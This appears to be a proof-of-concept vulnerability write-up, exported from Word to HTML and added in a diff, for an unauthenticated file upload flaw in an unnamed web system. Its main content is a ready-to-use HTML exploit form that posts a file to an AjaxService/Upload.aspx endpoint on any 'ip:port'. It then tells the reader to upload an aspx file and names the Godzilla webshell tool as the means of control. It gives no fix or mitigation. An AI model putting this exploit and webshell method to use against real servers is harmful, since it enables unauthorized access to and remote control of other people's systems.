@@ -1,0 +1,140 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=gb2312">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:等线;
+	panose-1:2 1 6 0 3 1 1 1 1 1;}
+@font-face
+	{font-family:"\@等线";
+	panose-1:2 1 6 0 3 1 1 1 1 1;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0cm;
+	text-align:justify;
+	text-justify:inter-ideograph;
+	font-size:10.5pt;
+	font-family:等线;}
+a:link, span.MsoHyperlink
+	{color:#0563C1;
+	text-decoration:underline;}
+.MsoChpDefault
+	{font-family:等线;}
+ /* Page Definitions */
+ @page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 90.0pt 72.0pt 90.0pt;
+	layout-grid:15.6pt;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+
+</head>
+
+<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='word-wrap:break-word;
+text-justify-trim:punctuation'>
+
+<div class=WordSection1 style='layout-grid:15.6pt'>
+
+<p class=MsoNormal><span lang=EN-US>1. <img width=553 height=313 id="图片 2"
+src="poc.files/image001.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US>2.</span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=307 id="图片 1"
+src="poc.files/image002.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US>The system has an unauthorized file upload
+vulnerability</span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=311 id="图片 3"
+src="poc.files/image003.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US>There are many systems</span></p>
+
+<p class=MsoNormal><b><span lang=EN-US>exp</span>：</b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&lt;!DOCTYPE html&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&lt;html&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;head&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;meta
+charset=&quot;utf-8&quot;&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;title&gt;exp&lt;/title&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/head&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;body&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;form
+action=&quot;<span style='color:red'>http://ip:port/AjaxService/Upload.aspx</span>&quot;
+method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;label
+for=&quot;file&quot;&gt;Filename&lt;/label&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input
+type=&quot;file&quot; name=&quot;<span style='color:red'>fdata&quot;
+id=&quot;fdata</span>&quot; /&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br
+/&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input
+type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submin&quot; /&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/form&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/body&gt;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&lt;/html&gt;</span></b></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=279 id="图片 13"
+src="poc.files/image004.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=281 id="图片 5"
+src="poc.files/image005.jpg"></span></p>
+
+<p class=MsoNormal><b><span lang=EN-US>Upload aspx file</span></b></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=290 id="图片 8"
+src="poc.files/image006.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=312 id="图片 9"
+src="poc.files/image007.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=554 height=310 id="图片 10"
+src="poc.files/image008.jpg"></span></p>
+
+<p class=MsoNormal><span lang=EN-US><img width=553 height=299 id="图片 11"
+src="poc.files/image009.jpg"></span></p>
+
+<p class=MsoNormal><b><span lang=EN-US>&nbsp;</span></b></p>
+
+<p class=MsoNormal><b><span lang=EN-US>Notes:</span></b><span lang=EN-US> <b>The
+tools used are:</b></span></p>
+
+<p class=MsoNormal><span lang=EN-US><a
+href="https://github.com/BeichenDream/Godzilla"><b>https://github.com/BeichenDream/Godzilla</b></a></span></p>
+
+<p class=MsoNormal><span lang=EN-US><img border=0 width=554 height=281
+id="图片 12" src="poc.files/image010.jpg"></span></p>
+
+</div>
+
+</body>
+
+</html>
